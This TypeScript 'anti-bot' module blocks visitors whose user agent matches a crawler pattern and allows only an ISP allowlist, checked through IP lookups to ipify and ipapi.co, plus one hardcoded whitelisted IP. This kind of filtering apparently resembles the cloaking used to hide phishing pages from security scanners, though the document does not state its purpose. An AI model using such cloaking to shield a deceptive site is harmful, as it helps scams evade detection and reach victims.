import axios from 'axios';
import { settings } from '../config/settings';

const { antiBot } = settings;
const allValidISPs = Object.values(antiBot.validISPs).flat();

// Liste des IPs autorisées
const whitelistedIPs = ['196.217.2.235'];

const getClientIP = async (): Promise<string> => {
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    return response.data.ip;
  } catch (error) {
    console.error('Error getting IP:', error);
    return '';
  }
};

const checkISP = async (ip: string): Promise<boolean> => {
  try {
    // Si l'IP est dans la liste blanche, on autorise directement
    if (whitelistedIPs.includes(ip)) {
      return true;
    }

    const response = await axios.get(`https://ipapi.co/${ip}/org`);
    const isp = response.data.toLowerCase();
    console.log(isp)
    return allValidISPs.some(provider => isp.includes(provider.toLowerCase()));
  } catch (error) {
    console.error('Error checking ISP:', error);
    return true;
  }
};

export const checkBot = async (): Promise<boolean> => {
  try {
    const userAgent = navigator.userAgent.toLowerCase();
    if (antiBot.crawlerRegex.test(userAgent)) {
      return false;
    }

    const clientIP = await getClientIP();
    if (clientIP) {
      // Si l'IP est dans la liste blanche, on autorise directement
      if (whitelistedIPs.includes(clientIP)) {
        return true;
      }

      const isValidISP = await checkISP(clientIP);
      if (!isValidISP) {
        return false;
      }
    }

    return true;
  } catch (error) {
    console.error('Erreur lors de la vérification anti-bot:', error);
    return true;
  }
};